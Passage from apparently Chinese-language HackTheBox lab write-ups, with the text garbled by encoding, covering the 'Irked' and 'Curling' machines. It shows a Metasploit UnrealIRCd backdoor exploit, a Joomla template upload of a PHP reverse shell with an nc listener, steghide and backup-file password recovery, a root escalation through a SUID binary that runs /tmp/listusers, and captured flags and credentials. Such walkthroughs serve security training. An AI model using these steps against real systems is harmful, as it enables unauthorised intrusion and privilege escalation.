exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; set rport 6697 rport =&gt; 6697 msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; exploit [*] Started reverse TCP double handler on 10.10.16.12:4444 [*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697... :irked.htb NOTICE AUTH :*** Looking up your hostname... [*] 10.10.10.117:6697 - Sending backdoor command... [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo SUUjSBbQaAoSC5R9; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Reading from socket B [*] B: &quot;SUUjSBbQaAoSC5R9\\r\\n&quot; [*] Matching... [*] A is input... [*] Command shell session 1 opened (10.10.16.12:4444 -&gt; 10.10.10.117:51640) at 2022-04-28 22:55:02 -0400 whoami&amp;&amp;id ircd uid=1001(ircd) gid=1001(ircd) groups=1001(ircd) æ¥ç€ä½¿ç”¨ shell è¿›å…¥ shell æ¨¡å¼ shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; ircd@irked:/home/djmardov/Documents$ ls -la ls -la total 16 drwxr-xr-x 2 djmardov djmardov 4096 May 15 2018 . drwxr-xr-x 18 djmardov djmardov 4096 Nov 3 2018 .. -rw-r--r-- 1 djmardov djmardov 52 May 16 2018 .backup -rw------- 1 djmardov djmardov 33 May 15 2018 user.txt æœ‰ç‚¹å¥‡æ€ªï¼Œæ˜æ˜æ˜¯ Linux ç³»ç»Ÿï¼Œdjmardov ç”¨æˆ·ç›®å½•å´æ˜¯ Windows çš„ç³»ç»Ÿç»“æ„ åœ¨ç›®å½• &#x2F;home&#x2F;djmardov&#x2F;Documents ä¸­æ‰¾åˆ°äº† user.txt flag æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬æƒé™ä¸å¤Ÿï¼Œè¿˜æœ‰ä¸€ä¸ª .backup æ–‡ä»¶ï¼Œæˆ‘ä»¬æœ‰æŸ¥çœ‹æƒé™ï¼Œçœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆ æƒé™æå‡Userircd@irked:/home/djmardov/Documents$ cat .backup cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss æˆ‘ç›´æ¥æ‹¿ç€è¿™æ®µå¯†ç å»ç™»å½• djmardov è´¦æˆ·æ˜¯ä¸è¡Œçš„ï¼Œæç¤ºå¤±è´¥ ç„¶åçœ‹ç€æç¤ºï¼Œè¿™ä¼¼ä¹æ˜¯ä¸€æ®µ steg çš„ç¼–ç ï¼Œè€Œæˆ‘ä»¬åˆæ²¡æœ‰è¦è§£å¯†çš„æ–‡ä»¶ï¼Œè¿™æ—¶å€™æˆ‘æƒ³èµ·æ¥ï¼Œå¯†ç ä¸€èˆ¬ä¼šè—åœ¨å“ªï¼Ÿå½“ç„¶æ˜¯å›¾ç‰‡é‡Œï¼Œè€Œå“ªé‡Œæœ‰å›¾ç‰‡å‘¢ï¼ŸHTTP æœåŠ¡çš„ä¸»é¡µæœ‰ä¸€å¼ å›¾ç‰‡ï¼ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# steghide extract -sf irked.jpg 1 â¨¯ Enter passphrase: wrote extracted data to &quot;pass.txt&quot;. åœ¨è¿™æç¤ºæˆ‘ä»¬è¾“å…¥å¯†ç ï¼Œåˆšæ‰ .backup é‡Œçš„å¯†ç å°±æœ‰ç”¨å¤„äº†ï¼Œè¾“å…¥å¯†ç åè§£å‹å‡ºæ¥ä¸€ä¸ª pass.txt æ–‡ä»¶ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat pass.txt Kab6h+m+bbp2J:HG å¾—åˆ°äº†å¯†ç  â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh djmardov@10.10.10.117 djmardov@10.10.10.117&#39;s password: The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Thu Apr 28 04:38:52 2022 from 10.10.14.3 djmardov@irked:~$ whoami&amp;&amp;id djmardov uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth) æˆåŠŸææƒåˆ° user ç”¨æˆ· djmardov@irked:~/Documents$ cat user.txt 4a66a78b12dc0e661a59d3f5c0267a8e æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡djmardov@irked:~$ find / -user root -perm -4000 -print 2&gt;/dev/null /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper /usr/sbin/exim4 /usr/sbin/pppd /usr/bin/chsh /usr/bin/procmail /usr/bin/gpasswd /usr/bin/newgrp /usr/bin/pkexec /usr/bin/X /usr/bin/passwd /usr/bin/chfn /usr/bin/viewuser /sbin/mount.nfs /bin/su /bin/mount /bin/fusermount /bin/ntfs-3g /bin/umount ä½¿ç”¨ find æŸ¥æ‰¾ä¸€ä¸‹ç‰¹æ®Šæƒé™æ–‡ä»¶ æ‰¾åˆ°äº†ä¸€ä¸ª &#x2F;usr&#x2F;bin&#x2F;viewuser æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ djmardov@irked:/usr/bin$ ./viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2022-04-28 02:46 (:0) djmardov pts/5 2022-04-28 23:22 (10.10.16.12) /tmp/listusers: connect: Connection refused å‘ç°è¿™é‡Œä¼¼ä¹è°ƒç”¨äº†ä¸€ä¸ª &#x2F;tmp&#x2F;listusers å‘ &#x2F;tmp&#x2F;listusers å†™å…¥æ–‡ä»¶ echo &quot;/bin/sh&quot; &gt; /tmp/listusers æ¥ç€æ‰§è¡Œ &#x2F;usr&#x2F;bin&#x2F;viewuser djmardov@irked:/tmp$ echo &quot;/bin/sh&quot; &gt; /tmp/listusers djmardov@irked:/tmp$ /usr/bin/viewuser This application is being devleoped to set and test user permissions It is still being actively developed (unknown) :0 2022-04-28 02:46 (:0) djmardov pts/5 2022-04-28 23:52 (10.10.16.12) # whoami&amp;&amp;id root uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth) æˆåŠŸææƒåˆ° root æƒé™ # cat /root/root.txt 8d8e9e8be64654b6dccc3bff4522daf3 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Curling - Hackthebox","slug":"Hackthebox - Curling","date":"2022-04-28T11:38:36.000Z","updated":"2023-05-20T01:31:07.000Z","comments":true,"path":"2022/04/28/Hackthebox - Curling/","link":"","permalink":"http://www.lucifiel.com/2022/04/28/Hackthebox%20-%20Curling/","excerpt":"","text":"Hackthebox - Curlingé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.150 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-26 21:40 EDT Nmap scan report for 10.10.10.150 Host is up (0.34s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: Joomla! - Open Source Content Management |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Home No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/26%OT=22%CT=1%CU=41478%PV=Y%DS=2%DC=T%G=Y%TM=62689FB OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=2%ISR=10B%TI=Z%CI=Z%II=I%TS=C)OPS OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1 OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3389/tcp) HOP RTT ADDRESS 1 338.76 ms 10.10.14.1 2 339.30 ms 10.10.10.150 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 175.76 seconds HTTP è¿™ä¸€å°ä¼¼ä¹æ˜¯å…³äºå†°å£¶çš„ï¼Œåˆ°å¤„çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡çœ‹åˆ°ä»€ä¹ˆçªç ´å£ï¼Œå¼±å£ä»¤ä¹Ÿæ²¡æœ‰ç™»å…¥è¿›å»ï¼Œå» Fuzz ä¸€ä¸‹ Fuzzâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# gobuster dir -u http://10.10.10.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error 1 â¨¯ =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.150/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/27 01:33:22 Starting gobuster in directory enumeration mode =============================================================== /media (Status: 301) [Size: 312] [--&gt; http://10.10.10.150/media/] /templates (Status: 301) [Size: 316] [--&gt; http://10.10.10.150/templates/] /images (Status: 301) [Size: 313] [--&gt; http://10.10.10.150/images/] /modules (Status: 301) [Size: 314] [--&gt; http://10.10.10.150/modules/] /bin (Status: 301) [Size: 310] [--&gt; http://10.10.10.150/bin/] /plugins (Status: 301) [Size: 314] [--&gt; http://10.10.10.150/plugins/] /includes (Status: 301) [Size: 315] [--&gt; http://10.10.10.150/includes/] /language (Status: 301) [Size: 315] [--&gt; http://10.10.10.150/language/] /components (Status: 301) [Size: 317] [--&gt; http://10.10.10.150/components/] /libraries (Status: 301) [Size: 316] [--&gt; http://10.10.10.150/libraries/] /cache (Status: 301) [Size: 312] [--&gt; http://10.10.10.150/cache/] /tmp (Status: 301) [Size: 310] [--&gt; http://10.10.10.150/tmp/] /layouts (Status: 301) [Size: 314] [--&gt; http://10.10.10.150/layouts/] /administrator (Status: 301) [Size: 320] [--&gt; http://10.10.10.150/administrator/] /cli (Status: 301) [Size: 310] [--&gt; http://10.10.10.150/cli/] /server-status (Status: 403) [Size: 277] =============================================================== 2022/04/27 01:59:29 Finished =============================================================== æŒ¨ä¸ªå»çœ‹ä¸€ä¸‹ åœ¨ &#x2F;administrator ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ª Joomlaï¼Œä½†æ˜¯ä¸çŸ¥é“ç‰ˆæœ¬ï¼Œæœç´¢äº†ä¸€ä¸‹ Joomla ä¹Ÿæ²¡æœ‰é»˜è®¤å¯†ç ï¼Œç»§ç»­çœ‹çœ‹ &lt;/body&gt; &lt;!-- secret.txt --&gt; &lt;/html&gt; åœ¨é¦–é¡µçš„æºä»£ç æœ€ä¸‹é¢çš„ 359 è¡Œå‘ç°äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ Q3VybGluZzIwMTgh â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# echo Q3VybGluZzIwMTgh|base64 -d Curling2018! æˆ‘çŒœæƒ³è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå¯†ç  ç„¶ååœ¨é¦–é¡µé¢è·å–åˆ°ä¸€ä¸ªè´¦å· username = Floris password = Curling2018! ç™»å½•æˆåŠŸï¼Œä½†è¿™é‡Œä¼¼ä¹æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæˆ‘ä»¬å°è¯•å» Joomla ç™»å½•è¯•è¯• ç™»å½•æˆåŠŸï¼Œä¸œè¥¿æ¯”è¾ƒå¤šï¼Œåˆ°å¤„æ‰¾æ‰¾æœ‰æ²¡æœ‰çªç ´å£ æ¼æ´åˆ©ç”¨ é€‰æ‹©é¦–é¡µé¢çš„ Global â†’ Media â†’ Legal Extensions (File Types) ç„¶åæ·»åŠ ä¸Šæˆ‘ä»¬è¦çš„åç¼€ php ä¿®æ”¹å¥½ä»¥åç‚¹å‡» Save&amp;close æ¥ç€ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç„¶åè®¿é—® Extensions â†’ Templates â†’ Templates â†’ Beez3 Details and Files æ¥ç€æ·»åŠ ä¸€ä¸ªæ–°æ–‡ä»¶ https://github.com/LucifielHack/php-reverse-shell/blob/master/php-reverse-shell.php æŠŠæˆ‘ä»¬çš„ reverse-shell.php ç»™ä¼ ä¸Šå» â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://10.10.10.150/templates/beez3/shell.php æ¥ç€è¯·æ±‚ä¸€ä¸‹æˆ‘ä»¬çš„ shell â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.12] from (UNKNOWN) [10.10.10.150] 40030 Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 06:24:26 up 31 min, 0 users, load average: 0.06, 0.01, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) bash: cannot set terminal process group (1262): Inappropriate ioctl for device bash: no job control in this shell www-data@curling:/$ whoami&amp;&amp;id whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell æ¥ç€ä¿®å¤ä¸€ä¸‹shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; Ctrl+Z stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 æƒé™æå‡Userwww-data@curling:/home$ ls floris www-data@curling:/home$ cd floris www-data@curling:/home/floris$ ls admin-area password_backup user.txt åœ¨ &#x2F;home&#x2F;floris ä¸­å‘ç°äº†ä¸€ä¸ªç›®å½• admin-area ä¸€ä¸ªæ–‡ä»¶ password_backup å…¶ä¸­ç›®å½•æˆ‘ä»¬æ²¡æƒé™è®¿é—®ï¼Œä½†æ–‡ä»¶æˆ‘ä»¬æœ‰æƒé™è®¿é—® www-data@curling:/home/floris$ cat password_backup 00000000: 425a 6839 3141 5926 5359 819b bb48 0000 BZh91AY&amp;SY...H.. 00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34 ....A...P)ava.:4 00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960 N...n.T.#.@%...` 00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000 ......z.@...... 00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800 ..i.4hdi...9.h.. 00000050: 000f 51a0 0064 681a 069e a190 0000 0034 ..Q..dh........4 00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0 i...5.n......J.. 00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78 .h...*..}y..&lt;~.x 00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931 .&gt;...sVT.zH....1 00000090: c856 921b 1221 3385 6046 a2dd c173 0d22 .V...!3.`F...s.&quot; 000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290 ..n....7j:X.d.R. 000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503 .k./... ....)p.. 000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843 7..;.....9...P.C 000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c .Y.P...HB....*.. 000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090 .G.. .U@r..rE8P. 000000f0: 819b bb48 ...H æŸ¥çœ‹åå‘ç°æ˜¯ä¹±ç ï¼Œä½¿ç”¨ xxd æŸ¥çœ‹å¹¶ä¿å­˜åˆ°æ–‡ä»¶ www-data@curling:/home/floris$ xxd -r password_backup &gt; /tmp/backup www-data@curling:/home/floris$ cd /tmp www-data@curling:/tmp$ file backup backup: bzip2 compressed data, block size = 900k æŸ¥çœ‹æ–‡ä»¶ç±»å‹å‘ç°æ˜¯ä¸€ä¸ª bzip2 çš„ç±»å‹ www-data@curling:/tmp$ mv backup backup.bz2 www-data@curling:/tmp$ bzip2 -d backup.bz2 www-data@curling:/tmp$ ls backup å’±ä»¬æŠŠè¿™ä¸ªæ–‡ä»¶è§£å‹å‡ºæ¥ï¼Œç„¶åå†å»çœ‹çœ‹ www-data@curling:/tmp$ ls backup www-data@curling:/tmp$ file backup backup: gzip compressed data, was &quot;password&quot;, last modified: Tue May 22 19:16:20 2018, from Unix è§£å‹å‡ºæ¥åå‘ç°æ˜¯ä¸ª gzip æ–‡ä»¶ï¼Œè¿˜å¾—è§£å‹ä¸€æ¬¡ www-data@curling:/tmp$ mv backup backup.gz www-data@curling:/tmp$ tar xvf backup.gz www-data@curling:/tmp$ ls backup.out www-data@curling:/tmp$ file backup.out backup.out: POSIX tar archive (GNU) åæ­£è¿™é‡Œå¾—è§£å‹å¥½å‡ æ¬¡ï¼Œç»™æˆ‘å¼„çš„æœ‰ç‚¹æ™•ï¼Œè¿˜ä»¥ä¸ºæ˜¯åœ¨æ— é™å¾ªç¯å‘¢ www-data@curling:/tmp$ mv backup.out backup.tar www-data@curling:/tmp$ tar xvf backup.tar password.txt æ€»ç®—è§£å‹å®Œäº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶ www-data@curling:/tmp$ cat password.txt 5d&lt;wdCbdZu)|hChXll æ„Ÿè§‰è¿™æ˜¯ç”¨æˆ· floris çš„å¯†ç äº†ï¼Œå»ç™»å½• ssh è¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh floris@10.10.10.150 The authenticity of host &#39;10.10.10.150 (10.10.10.150)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.150&#39; (ECDSA) to the list of known hosts. floris@10.10.10.150&#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu Apr 28 06:53:07 UTC 2022 System load: 0.0 Processes: 172 Usage of /: 49.2% of 9.78GB Users logged in: 0 Memory usage: 25% IP address for ens33: 10.10.10.150 Swap usage: 0% 0 updates can be applied immediately. Last login: Wed Sep 8 11:42:07 2021 from 10.10.14.15 floris@curling:~$ whoami&amp;&amp;id floris uid=1000(floris) gid=1004(floris) groups=1004(floris) æˆåŠŸææƒåˆ° user æƒé™ç”¨æˆ· floris@curling:~$ cat user.txt 65dd1df0713b40d88ead98cf11b8530b æˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶ Rootfloris@curling:~$ sudo -l [sudo] password for floris: Sorry, user floris may not run sudo on curling. sudo -l æ²¡æœ‰ä¸œè¥¿ï¼Œå’±ä»¬è¿˜æ˜¯ç€çœ¼äº admin-area ç›®å½•å§ floris@curling:~/admin-area$ ls -la total 28 drwxr-x--- 2 root floris 4096 May 22 2018 . drwxr-xr-x 6 floris floris 4096 May 22 2018 .. -rw-rw---- 1 root floris 25 Apr 28 06:55 input -rw-rw---- 1 root floris 14236 Apr 28 06:55 report è¿™è¾¹æ˜¯æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å’±ä»¬æœ‰æŸ¥çœ‹å’Œå†™å…¥æƒé™ floris@curling:~/admin-area$ cat input url = &quot;http://127.0.0.1&quot; floris@curling:~/admin-area$ cat report &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en-gb&quot; dir=&quot;ltr&quot;&gt; &lt;head&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;base href=&quot;http://127.0.0.1/&quot; /&gt; &lt;meta name=&quot;description&quot; content=&quot;best curling site on the planet!&quot; /&gt; &lt;meta name=&quot;generator&quot; content=&quot;Joomla! - Open Source Content Management&quot; /&gt; &lt;title&gt;Home&lt;/title&gt; &lt;link href=&quot;/index.php?format=feed&amp;type=rss&quot; rel=&quot;alternate&quot; type=&quot;application/rss+xml&quot; title=&quot;RSS 2.0&quot; /&gt; &lt;link href=&quot;/index.php?format=feed&amp;type=atom&quot; rel=&quot;alternate&quot; type=&quot;application/atom+xml&quot; title=&quot;Atom 1.0&quot; /&gt; &lt;link href=&quot;/templates/protostar/favicon.ico&quot; rel=&quot;shortcut icon&quot; type=&quot;image/vnd.microsoft.icon&quot; /&gt; &lt;link href=&quot;/templates/protostar/css/template.css?b6bf078482bc6a711b54fa9e74e19603&quot; rel=&quot;stylesheet&quot; /&gt; &lt;link href=&quot;https://fonts.googleapis.com/css?family=Open+Sans&quot; rel=&quot;stylesheet&quot; /&gt; &lt;style&gt; h1, h2, h3, h4, h5, h6, .site-title { font-family: &#39;Open Sans&#39;, sans-serif; } &lt;/style&gt; &lt;script type=&quot;application/json&quot; class=&quot;joomla-script-options new&quot;&gt;{&quot;csrf.token&quot;:&quot;e6b8a82d84a03e7e05d6452f52f975f7&quot;,&quot;system.paths&quot;:{&quot;root&quot;:&quot;&quot;,&quot;base&quot;:&quot;&quot;},&quot;system.keepalive&quot;:{&quot;interval&quot;:840000,&quot;uri&quot;:&quot;\\/index.php\\/component\\/ajax\\/?format=json&quot;}}&lt;/script&gt; &lt;script src=&quot;/media/jui/js/jquery.min.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/media/jui/js/jquery-noconflict.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/media/jui/js/jquery-migrate.min.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/media/system/js/caption.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/media/jui/js/bootstrap.min.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script src=&quot;/templates/protostar/js/template.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;!--[if lt IE 9]&gt;&lt;script src=&quot;/media/jui/js/html5.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt; &lt;script src=&quot;/media/system/js/core.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;!--[if lt IE 9]&gt;&lt;script src=&quot;/media/system/js/polyfill.event.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt;&lt;![endif]--&gt; &lt;script src=&quot;/media/system/js/keepalive.js?b6bf078482bc6a711b54fa9e74e19603&quot;&gt;&lt;/script&gt; &lt;script&gt; jQuery(window).on(&#39;load&#39;, function() { new JCaption(&#39;img.caption&#39;); jQuery(function($){ initTooltips(); $(&quot;body&quot;).on(&quot;subform-row-add&quot;, initTooltips); function initTooltips (event, container) { container = container || document;$(container).find(&quot;.hasTooltip&quot;).tooltip({&quot;html&quot;: true,&quot;container&quot;: &quot;body&quot;});} }); &lt;/script&gt; &lt;/head&gt; &lt;body class=&quot;site com_content view-featured no-layout no-task itemid-101&quot;&gt; &lt;!-- Body --&gt; &lt;div class=&quot;body&quot; id=&quot;top&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;!-- Header --&gt; &lt;header class=&quot;header&quot; role=&quot;banner&quot;&gt; &lt;div class=&quot;header-inner clearfix&quot;&gt; &lt;a class=&quot;brand pull-left&quot; href=&quot;/&quot;&gt; &lt;span class=&quot;site-title&quot; title=&quot;Cewl Curling site!&quot;&gt;Cewl Curling site!&lt;/span&gt; &lt;/a&gt; &lt;div class=&quot;header-search pull-right&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/header&gt; &lt;div class=&quot;row-fluid&quot;&gt; &lt;main id=&quot;content&quot; role=&quot;main&quot; class=&quot;span9&quot;&gt; &lt;!-- Begin Content --&gt; &lt;div id=&quot;system-message-container&quot;&gt; &lt;/div&gt; &lt;div class=&quot;blog-featured&quot; itemscope itemtype=&quot;https://schema.org/Blog&quot;&gt; &lt;div class=&quot;page-header&quot;&gt; &lt;h1&gt; Home &lt;/h1&gt; &lt;/div&gt; &lt;div class=&quot;items-leading clearfix&quot;&gt; &lt;div class=&quot;leading-0 clearfix&quot; itemprop=&quot;blogPost&quot; itemscope itemtype=&quot;https://schema.org/BlogPosting&quot;&gt; &lt;h2 class=&quot;item-title&quot; itemprop=&quot;headline&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/3-what-s-the-object-of-curling&quot; itemprop=&quot;url&quot;&gt; What&#39;s the object of curling? &lt;/a&gt; &lt;/h2&gt; &lt;div class=&quot;icons&quot;&gt; &lt;div class=&quot;btn-group pull-right&quot;&gt; &lt;button class=&quot;btn dropdown-toggle&quot; type=&quot;button&quot; id=&quot;dropdownMenuButton-3&quot; aria-label=&quot;User tools&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt; &lt;span class=&quot;icon-cog&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;caret&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;ul class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdownMenuButton-3&quot;&gt; &lt;li class=&quot;print-icon&quot;&gt; &lt;a href=&quot;/index.php/2-uncategorised/3-what-s-the-object-of-curling?tmpl=component&amp;print=1&quot; title=&quot;Print article &lt; What&#39;s the object of curling? &gt;&quot; onclick=&quot;window.open(this.href,&#39;win2&#39;,&#39;status=no,toolbar=no,scrollbars=yes,titlebar=no,menubar=no,resizable=yes,width=640,height=480,directories=no,location=no&#39;); return false;&quot; rel=&quot;nofollow&quot;&gt; &lt;span class=&quot;icon-print&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; Print &lt;/a&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;dl class=&quot;article-info muted&quot;&gt; &lt;dt class=&quot;article-info-term&quot;&gt; Details &lt;/dt&gt; &lt;dd class=&quot;createdby&quot; itemprop=&quot;author&quot; itemscope itemtype=&quot;https://schema.org/Person&quot;&gt; Written by &lt;span itemprop=&quot;name&quot;&gt;Super User&lt;/span&gt; &lt;/dd&gt; &lt;dd class=&quot;category-name&quot;&gt; Category: &lt;a href=&quot;/index.php/2-uncategorised&quot; itemprop=&quot;genre&quot;&gt;Uncategorised&lt;/a&gt; &lt;/dd&gt; &lt;dd class=&quot;published&quot;&gt; &lt;span class=&quot;icon-calendar&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;time datetime=&quot;2018-05-22T18:54:21+00:00&quot; itemprop=&quot;datePublished&quot;&gt; Published: 22 May 2018 &lt;/time&gt; &lt;/dd&gt; &lt;dd class=&quot;hits&quot;&gt; &lt;span class=&quot;icon-eye-open&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;meta itemprop=&quot;interactionCount&quot; content=&quot;UserPageVisits:5&quot; /&gt; Hits: 5 &lt;/dd&gt; &lt;/dl&gt; &lt;p&gt;Good question. First, let&#39;s get a bit of the jargon down. The playing surface in curling is called &quot;the sheet.&quot; Sheet dimensions can vary, but they&#39;re usually around 150 feet long by about 15 feet wide. The sheet is covered with tiny droplets of water that become ice and cause the stones to &quot;curl,&quot; or deviate from a straight path. These water droplets are known as &quot;pebble.&quot;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;items-row cols-3 row-0 row-fluid&quot;&gt; &lt;div 